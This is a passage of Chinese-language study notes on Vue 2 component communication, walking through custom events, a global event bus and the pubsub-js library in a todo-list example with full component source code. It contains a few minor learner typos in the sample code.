  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

保存数据

![image-20250118181334126](.\images\image-20250118181334126.png)





### 2.12 自定义事件

#### 绑定自定义事件

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```



src\App.vue

```vue
<template>
  <div class="app">
    <h1>{{ msg }},学生是: {{ studentName }}</h1>

    <!-- 方式1：通过父组件组子组件传递函数类型的props实现，子给父传递数据 -->
    <School :getSchoolName="getSchoolName" />

    <hr />
    <!-- 方式2：通过父组件绑定一个自定义事件实现子给父传递数据（使用@或者v-on） -->
    <!-- <Student v-on:userClick="getStudentName" /> -->
    <!-- <Student @userClick="getStudentName" /> -->

    <!-- 方式3：通过父组件组子组件绑定一个自定义事件实现，子给父传递数据（使用ref） -->
    <Student ref="student" />
  </div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";

export default {
  name: "App",
  components: {
    School,
    Student,
  },
  data() {
    return {
      msg: "你好啊!",
      studentName: "空空",
    };
  },
  methods: {
    getSchoolName(name) {
      console.log("App收到了学校名：", name);
    },
    getStudentName(name, ...params) {
      console.log("App收到了学生名", name, params);
    },
  },
  mounted() {
    //绑定自定义事件
    this.$refs.student.$on("userClick", this.getStudentName);
    // 绑定自定义事件（一次性）
    // this.$refs.student.$once("userClick", this.getStudentName);
  },
};
</script>

<style>
.app {
  background-color: gray;
}
</style>
```

src\components\School.vue

```vue
<template>
  <div class="school">
    <h2>学校名称: {{ name }}</h2>
    <h2>学校地址: {{ address }}</h2>
    <button @click="sendSchoolName">点击显示学校名称</button>
  </div>
</template>

<script>
export default {
  name: "School",
  props: ["getSchoolName"],
  data() {
    return {
      name: "交大",
      address: "上海闵行",
    };
  },
  methods:{
    sendSchoolName()
    {
      this.getSchoolName(this.name);
    }
  }
};
</script>

<style scoped>
.school {
  background-color: skyblue;
  padding: 5px;
}
</style>
```

src\components\Student.vue

```vue
<template>
  <div class="student">
    <h2>学生姓名:{{ name }}</h2>
    <h2>学生姓别:{{ sex }}</h2>
    <button @click="sendStudentName">把学生名发送给App</button>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "nullnull",
      sex: "男",
    };
  },
  methods: {
    sendStudentName() {
      this.$emit("userClick", this.name, 111, 222, 333);
    },
  },
};
</script>

<style scoped>
.student {
  background-color: pink;
  padding: 5px;
  margin-top: 30px;
}
</style>
```

页面查看

![image-20250118224343561](.\images\image-20250118224343561.png)



#### 解绑自定义事件

```vue
<template>
  <div class="student">
    <h2>学生姓名:{{ name }}</h2>
    <h2>学生姓别:{{ sex }}</h2>
    <button @click="sendStudentName">把学生名发送给App</button>
    <button @click="unbind">解绑userClick事件</button>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "nullnull",
      sex: "男",
    };
  },
  methods: {
    sendStudentName() {
      this.$emit("userClick", this.name, 111, 222, 333);
    },
    unbind(){
      //解绑一个自定义事件
      this.$off('userClick');
      //解绑多个自定义事件
      //this.$off(['userClick'])
      //解绑所有自定义事件
      //this.$off()
    }
  },
};
</script>

<style scoped>
.student {
  background-color: pink;
  padding: 5px;
  margin-top: 30px;
}
</style>
```



#### 注意事项ref

```vue
<template>
  <div class="app">
    <h1>{{ msg }},学生是: {{ studentName }}</h1>

    <!-- 方式1：通过父组件组子组件传递函数类型的props实现，子给父传递数据 -->
    <School :getSchoolName="getSchoolName" />

    <hr />
    <!-- 方式2：通过父组件绑定一个自定义事件实现子给父传递数据（使用@或者v-on） -->
    <!-- <Student v-on:userClick="getStudentName" /> -->
    <!-- <Student @userClick="getStudentName" /> -->

    <!-- 方式3：通过父组件组子组件绑定一个自定义事件实现，子给父传递数据（使用ref） -->
    <Student ref="student" />
  </div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";

export default {
  name: "App",
  components: {
    School,
    Student,
  },
  data() {
    return {
      msg: "你好啊!",
      studentName: "",
    };
  },
  methods: {
    getSchoolName(name) {
      console.log("App收到了学校名：", name);
    },
    // getStudentName(name, ...params) {
    //   console.log("App收到了学生名", name, params);
    //   this.studentName = name;
    // },
  },
  mounted() {
    //绑定自定义事件
    //this.$refs.student.$on("userClick", this.getStudentName);
    // 绑定自定义事件（一次性）
    // this.$refs.student.$once("userClick", this.getStudentName);

    //使用此方式绑定自定义事件
    //如果采用此方式将不能对studentName属性值进行设置。
    //此时在APP中的This并不是App的VC，此时的VC的对象是Student，
    //用VUE的解释就是谁触发了事件，此是的this就是谁，由于是Student触发了事件，所以此时的VC就是Student。
    // this.$refs.student.$on("userClick", function (name, ...params) {
    //   console.log("App收到了学生名", name, params);
    //   this.studentName = name;
    // });

    //如果使用是箭头函数，由于箭头函数没有this，就会向外找，此时的this就是App对象的VC。
    this.$refs.student.$on("userClick", (name, ...params) => {
      console.log("App收到了学生名2", name, params);
      this.studentName = name;
    });


    //绑定自定义事件
    //如果方法写在了methods ，并且还是普通函数，那此getStudentName的实例对象一定是App的实例对象。
    //this.$refs.student.$on("userClick", this.getStudentName);
  },
};
</script>

<style>
.app {
  background-color: gray;
}
</style>
```

输出：

![image-20250119201028860](.\images\image-20250119201028860.png)



#### 组件使用原生的事件

```vue
<template>
  <div class="app">
    <h1>{{ msg }},学生是: {{ studentName }}</h1>

    <!-- 方式1：通过父组件组子组件传递函数类型的props实现，子给父传递数据 -->
    <School :getSchoolName="getSchoolName" />

    <hr />
    <!-- 方式2：通过父组件绑定一个自定义事件实现子给父传递数据（使用@或者v-on） -->
    <!-- <Student v-on:userClick="getStudentName" /> -->
    <!-- <Student @userClick="getStudentName" /> -->

    <!-- 方式3：通过父组件组子组件绑定一个自定义事件实现，子给父传递数据（使用ref） -->
    <!-- <Student ref="student"/> -->
    <!-- 告诉Vue使用原生的click事件,此时事件就被绑定到了Student最外层的div元素上 -->
    <Student ref="student" @click.native="show" />
  </div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";

export default {
  name: "App",
  components: {
    School,
    Student,
  },
  data() {
    return {
      msg: "你好啊!",
      studentName: "",
    };
  },
  methods: {
    getSchoolName(name) {
      console.log("App收到了学校名：", name);
    },
    getStudentName(name, ...params) {
      console.log("App收到了学生名", name, params);
      this.studentName = name;
    },
    show() {
      alert("show invoke");
    },
  },
  mounted() {
    //绑定自定义事件
    //this.$refs.student.$on("userClick", this.getStudentName);
    // 绑定自定义事件（一次性）
    // this.$refs.student.$once("userClick", this.getStudentName);

    //使用此方式绑定自定义事件
    //如果采用此方式将不能对studentName属性值进行设置。
    //此时在APP中的This并不是App的VC，此时的VC的对象是Student，
    //用VUE的解释就是谁触发了事件，此是的this就是谁，由于是Student触发了事件，所以此时的VC就是Student。
    // this.$refs.student.$on("userClick", function (name, ...params) {
    //   console.log("App收到了学生名", name, params);
    //   this.studentName = name;
    // });

    //如果使用是箭头函数，由于箭头函数没有this，就会向外找，此时的this就是App对象的VC。
    this.$refs.student.$on("userClick", (name, ...params) => {
      console.log("App收到了学生名2", name, params);
      this.studentName = name;
    });

    //绑定自定义事件,推荐使用此方式，不用考滤箭头函数还是普通 函数的问题
    //如果方法写在了methods ，并且还是普通函数，那此getStudentName的实例对象一定是App的实例对象。
    //this.$refs.student.$on("userClick", this.getStudentName);
  },
};
</script>

<style>
.app {
  background-color: gray;
}
</style>
```

访问网页,对网页进行访问。

![image-20250119203014710](.\images\image-20250119203014710.png)



#### 总结

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！



### 2.13 todolist使用自定义事件

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <!-- <NullHeader :addTodoItem="addTodoItem" /> -->
        <!-- 使用自定义事件改写 -->
        <NullHeader @addTodoItem="addTodoItem" />
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        />
        <!-- <NullFooter
          :todos="todos"
          :checkAllOrNot="checkAllOrNot"
          :cleanFinish="cleanFinish"
        /> -->
        <!-- 使用自定义事件改写  -->
        <NullFooter
          :todos="todos"
          @checkAllOrNot="checkAllOrNot"
          @cleanFinish="cleanFinish"
        />
      </div>
    </div>
  </div>
</template>

<script>
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      //将数据存储至localStorage中
      todos: JSON.parse(localStorage.getItem("todos")) || [],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    deleteTodoBox(id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done) {
      this.todos.forEach((item) => {
        item.done = done;
      });
    },
    cleanFinish() {
      this.todos = this.todos.filter((item) => {
        return !item.done;
      });
    },
  },
  watch: {
    // 当检测到数据改变时，将数据进行保存至localStorage操作
    todos: {
      deep: true,
      handler(value) {
        localStorage.setItem("todos", JSON.stringify(value));
      },
    },
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>

```

src\components\NullFooter.vue

```vue
<template>
  <!-- 使用数据集的大小，非0即为true -->
  <div class="todo-footer" v-show="countTotal">
    <label>
      <!-- <input type="checkbox" :checked="isAllChecked" @change="checkAll" /> -->
      <input type="checkbox" v-model="isAllChecked" />
    </label>
    <span>
      <span>已完成{{ countDoneNum }}</span> / 全部{{ countTotal }}
    </span>
    <button class="btn btn-danger" @click="cleanAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "NullFooter",
  //此时数据还是需要传递的，但方法无需再传递
  // props: ["todos", "checkAllOrNot","cleanFinish"],
  props: ["todos"],
  computed: {
    countTotal() {
      return this.todos.length;
    },
    countDoneNum: {
      get() {
        let num = 0;
        this.todos.forEach((item) => {
          if (item.done) {
            num++;
          }
        });

        return num;
      },
    },
    isAllChecked: {
      get() {
        return this.countTotal == this.countDoneNum && this.countTotal > 0;
      },
      //set在传递时，值就为true或者false，表示选择与未选择
      set(value) {
        //使用自定义事件调用
        // this.checkAllOrNot(value);
        this.$emit('checkAllOrNot', value);
      },
    },
  },
  methods: {
    // 此使用计算属性来实现更为便捷
    // checkAll(e)
    // {
    //   this.checkAllOrNot(e.target.checked);
    // }
    cleanAll() {
      //使用自定义事件来改写
      // this.cleanFinish();
      this.$emit('cleanFinish');
    },
  },
};
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>

```

src\components\NullHeader.vue

```vue
<template>
    <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="userInput"/>
    </div>
</template>

<script>
import {nanoid} from 'nanoid'

export default {
    name: 'NullHeader',
    //使用自定义事件无需再接收参数
    //props: ["addTodoItem"],
    methods: {
        userInput(event){
            //校验数据不能为空
            if(!event.target.value.trim())
            {
                alert('输入不能为空');
                return;
            }
            //将用户输入的信息包装成一个todo对象
            const todoObj = {id: nanoid(),title: event.target.value,done:false};
            //此时必须使用this，才是vc对象。调用receive方法
            //通过APP组件添加一个数据
            //此时不需要再调用添加方法，触发一个事件即可
            //this.addTodoItem(todoObj);
            this.$emit('addTodoItem',todoObj);
            //清空输入
            event.target.value = '';
        }
    }
}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```

src\components\NullList.vue

```vue
<template>
  <ul class="todo-main">
    <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
      :checkedTodoBox="checkedTodoBox"
	  :deleteTodoBox="deleteTodoBox"
    />
  </ul>
</template>

<script>
import NullItem from "./NullItem.vue";

export default {
  name: "NullFooter",
  components: { NullItem },
  props: ["todos", "checkedTodoBox","deleteTodoBox"],
};
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

src\components\NullItem.vue

```vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" />
	  <!-- 如下代码也能实现功能，但不推荐，违反了原则，因为修改了props中的值 -->
	  <!-- <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" /> -->
      <span>{{todoItem.title}}</span>
    </label>
    <button class="btn btn-danger" @click="deleteHandler(todoItem.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "NullItem",
  //声明接收传递过来的todoItem对象
  props: ["todoItem","checkedTodoBox","deleteTodoBox"],
  methods:{
	checkHandler(id){
		//通知组件将对应的done值取反。
		this.checkedTodoBox(id);
	},
	deleteHandler(id){
		if(confirm('确定删除数据吗?'))
		{
			this.deleteTodoBox(id);
		}
	}
  }
};
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

/* 鼠标悬浮时进行显示。 */
li:hover button {
  display: block;
}
</style>
```

启动服务，进行页面操作，添加元素，并清除元素

![image-20250119210851873](.\images\image-20250119210851873.png)



### 2.13 事件总线

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App),
    beforeCreate(){
        //注册一个全局的事件总线
        Vue.prototype.$bus = this;
    }
})
```

src\App.vue

```vue
<template>
  <div class="app">
    <h1>你好啊</h1>
    <School/>
    <hr/>
    <Student/>
  </div>
</template>

<script>

// 由引入的顺序，在冲突时使用哪个样式，后引入的覆盖前面的
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components:{
        School,
        Student
    }
}
</script>

<style>
    .app{
        background-color: springgreen;
    }
</style>
```

src\components\School.vue

```vue
<template>
  <div class="demo">
    <h2>学校名称: {{ name }}</h2>
    <h2>{{ address }}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "交大",
      address: "上海闵行",
    };
  },
  mounted(){
    this.$bus.$on('hello',(data)=>{
      console.log('我是School组件，收到了数据',data);
    })
  },
  beforeDestroy(){
    //当组件销毁时，自动解绑当前组件所用的事件。
    this.$bug.$off('hello');
  }
};
</script>

<style scoped>
.demo {
  background-color: skyblue;
}
</style>

```

src\components\Student.vue

```vue
<template>
  <div class="demo">
    <h2>学生姓名:{{ name }}</h2>
    <h2>学生性别:{{ sex }}</h2>
    <button @click="sendStudentName">把学生名称传递给School组件</button>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "nullnull",
      sex: "男",
    };
  },
  methods: {
    sendStudentName() {
      //将当前的学生名称传递给事件总线
      this.$bus.$emit('hello',this.name);
    },
  },
};
</script>

<style scoped>
.demo {
  background-color: pink;
}
</style>

```

打开页面点击按钮

![image-20250119222354866](.\images\image-20250119222354866.png)

#### 总结

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。





### 2.14 todolist使用全局事件总线

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false

//创建VM
new Vue({
    el: '#app',
	render: h => h(App),
    beforeCreate(){
        //注册全局事件总线
        Vue.prototype.$bus = this;
    }
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <!-- <NullHeader :addTodoItem="addTodoItem" /> -->
        <!-- 使用自定义事件改写 -->
        <NullHeader @addTodoItem="addTodoItem" />
        <!--        
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        /> -->
        <!-- 使用全局事件总线来处理 -->
        <NullList :todos="todos" />

        <!-- <NullFooter
          :todos="todos"
          :checkAllOrNot="checkAllOrNot"
          :cleanFinish="cleanFinish"
        /> -->
        <!-- 使用自定义事件改写  -->
        <NullFooter
          :todos="todos"
          @checkAllOrNot="checkAllOrNot"
          @cleanFinish="cleanFinish"
        />
      </div>
    </div>
  </div>
</template>

<script>
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      //将数据存储至localStorage中
      todos: JSON.parse(localStorage.getItem("todos")) || [],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    deleteTodoBox(id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done) {
      this.todos.forEach((item) => {
        item.done = done;
      });
    },
    cleanFinish() {
      this.todos = this.todos.filter((item) => {
        return !item.done;
      });
    },
  },
  watch: {
    // 当检测到数据改变时，将数据进行保存至localStorage操作
    todos: {
      deep: true,
      handler(value) {
        localStorage.setItem("todos", JSON.stringify(value));
      },
    },
  },
  mounted(){
    //注册全局事件
    this.$bus.$on('checkedTodoBox',this.checkedTodoBox);
    this.$bus.$on('deleteTodoBox',this.deleteTodoBox);
  },
  beforeDestroy(){
    //组件销毁时，解绑事件
    this.$bus.$off('checkedTodoBox');
    this.$bus.$off('deleteTodoBox');
  }
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>

```

src\components\NullList.vue

```vue
<template>
  <ul class="todo-main">
    <!-- <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
      :checkedTodoBox="checkedTodoBox"
	  :deleteTodoBox="deleteTodoBox"
    /> -->

    <!-- 使用事件总线后，无需传递 -->
    <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
    />
  </ul>
</template>

<script>
import NullItem from "./NullItem.vue";

export default {
  name: "NullFooter",
  components: { NullItem },
  //使用事件总线后，无需通过props传递
  // props: ["todos", "checkedTodoBox","deleteTodoBox"],
  props: ["todos"],
};
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

src\components\NullItem.vue

```vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" />
	  <!-- 如下代码也能实现功能，但不推荐，违反了原则，因为修改了props中的值 -->
	  <!-- <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" /> -->
      <span>{{todoItem.title}}</span>
    </label>
    <button class="btn btn-danger" @click="deleteHandler(todoItem.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "NullItem",
  //声明接收传递过来的todoItem对象
  // props: ["todoItem","checkedTodoBox","deleteTodoBox"],
  //使用事件总线，无需传递
  props: ["todoItem"],
  methods:{
	checkHandler(id){
		//通知组件将对应的done值取反。
		// this.checkedTodoBox(id);
    //使用全局事件总线触发
    this.$bus.$emit('checkedTodoBox',id)
	},
	deleteHandler(id){
		if(confirm('确定删除数据吗?'))
		{
			//this.deleteTodoBox(id);
      //使用全局事件总线触发
      this.$bus.$emit('deleteTodoBox',id);
		}
	}
  }
};
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

/* 鼠标悬浮时进行显示。 */
li:hover button {
  display: block;
}
</style>
```

src\components\NullHeader.vue

```vue
<template>
    <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="userInput"/>
    </div>
</template>

<script>
import {nanoid} from 'nanoid'

export default {
    name: 'NullHeader',
    //使用自定义事件无需再接收参数
    //props: ["addTodoItem"],
    methods: {
        userInput(event){
            //校验数据不能为空
            if(!event.target.value.trim())
            {
                alert('输入不能为空');
                return;
            }
            //将用户输入的信息包装成一个todo对象
            const todoObj = {id: nanoid(),title: event.target.value,done:false};
            //此时必须使用this，才是vc对象。调用receive方法
            //通过APP组件添加一个数据
            //此时不需要再调用添加方法，触发一个事件即可
            //this.addTodoItem(todoObj);
            this.$emit('addTodoItem',todoObj);
            //清空输入
            event.target.value = '';
        }
    }
}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```



src\components\NullFooter.vue

```vue
<template>
  <!-- 使用数据集的大小，非0即为true -->
  <div class="todo-footer" v-show="countTotal">
    <label>
      <!-- <input type="checkbox" :checked="isAllChecked" @change="checkAll" /> -->
      <input type="checkbox" v-model="isAllChecked" />
    </label>
    <span>
      <span>已完成{{ countDoneNum }}</span> / 全部{{ countTotal }}
    </span>
    <button class="btn btn-danger" @click="cleanAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "NullFooter",
  //此时数据还是需要传递的，但方法无需再传递
  // props: ["todos", "checkAllOrNot","cleanFinish"],
  props: ["todos"],
  computed: {
    countTotal() {
      return this.todos.length;
    },
    countDoneNum: {
      get() {
        let num = 0;
        this.todos.forEach((item) => {
          if (item.done) {
            num++;
          }
        });

        return num;
      },
    },
    isAllChecked: {
      get() {
        return this.countTotal == this.countDoneNum && this.countTotal > 0;
      },
      //set在传递时，值就为true或者false，表示选择与未选择
      set(value) {
        //使用自定义事件调用
        // this.checkAllOrNot(value);
        this.$emit('checkAllOrNot', value);
      },
    },
  },
  methods: {
    // 此使用计算属性来实现更为便捷
    // checkAll(e)
    // {
    //   this.checkAllOrNot(e.target.checked);
    // }
    cleanAll() {
      //使用自定义事件来改写
      // this.cleanFinish();
      this.$emit('cleanFinish');
    },
  },
};
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>

```



页面效果

![image-20250119225942765](.\images\image-20250119225942765.png)





### 2.15 pubsub-发布订阅模式

此需在额外安装第三方库

```sh
npm i pubsub-js
```





src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false


//创建VM
new Vue({
    el: '#app',
	render: h => h(App)
})
```

src\App.vue

```vue
<template>
  <div>
    <h1 class="title">你好啊</h1>
    <School/>
    <hr/>
    <Student/>
  </div>
</template>

<script>

// 由引入的顺序，在冲突时使用哪个样式，后引入的覆盖前面的
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components:{
        School,
        Student
    }
}
</script>

<style>
    .title{
        color: red
    }
</style>
```

src\components\Student.vue

```vue
<template>
  <div class="demo">
    <h2 class="title">学生姓名:{{ name }}</h2>
    <h2>姓名:{{ sex }}</h2>
    <button @click="sendStudentName">把学生名称交给School组件</button>
  </div>
</template>

<script>
//  npm i pubsub-js 安装
import pubsub from 'pubsub-js'
export default {
  name: "Student",
  data() {
    return {
      name: "nullnull",
      sex: "男",
    };
  },
  methods:{
    sendStudentName(){
      pubsub.publish('hello',123);
    }
  }
};
</script>

<style scoped>
.demo {
  background-color: pink;
}
</style>
```

src\components\School.vue

```vue
<template>
  <div class="demo">
    <h2>学校名称: {{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
  </div>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "School",
  data() {
    return {
      name: "交大",
      address: "上海闵行",
    };
  },
  mounted(){
   this.pubId =  pubsub.subscribe('hello',(msgName,data)=>{
      console.log(this);
      console.log('有人发布了hello事件，执行了subscribe方法',msgName,data);
    })
  },
  beforeDestory(){
    //当组件销毁时，解绑掉注册的事件
    pubsub.unsubscribe(this.pubId);
  }
};
</script>

<style scoped>
.demo {
  background-color: skyblue;
}
</style>

```

访问网页

![image-20250120230428610](.\images\image-20250120230428610.png)



### 2.16 totoList的删除使用发布订阅

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'


//关闭Vue的生产提示
Vue.config.productionTip = false

//创建VM
new Vue({
    el: '#app',
